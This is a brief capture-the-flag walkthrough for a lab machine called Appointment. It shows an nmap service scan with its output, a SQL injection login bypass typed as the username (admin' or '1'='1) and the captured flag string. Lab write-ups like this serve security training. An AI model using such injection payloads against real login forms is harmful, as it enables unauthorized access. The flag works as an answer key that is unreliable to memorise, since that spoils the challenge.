# CTF Walkthrough: Appointment

## Table of Contents
- [1. Introduction](#1-introduction)
- [2. Steps](#2-steps)

---

## 1. Introduction

**Category:** SQL Injection     
**Difficulty Level:** Very Easy   
**CVE(s) involved:** -

---

## 2. Steps

1. Service Enumeration
    - Command: `nmap -sV 10.129.74.183`
        - Output:
            ```
            PORT   STATE SERVICE VERSION
            80/tcp open  http    Apache httpd 2.4.38 ((Debian))
            ```

2. SQL inject
    - Username: admin' or '1'='1

3. Get flag
    - Flag: e3d0796d002a446c0e622226f42e9672
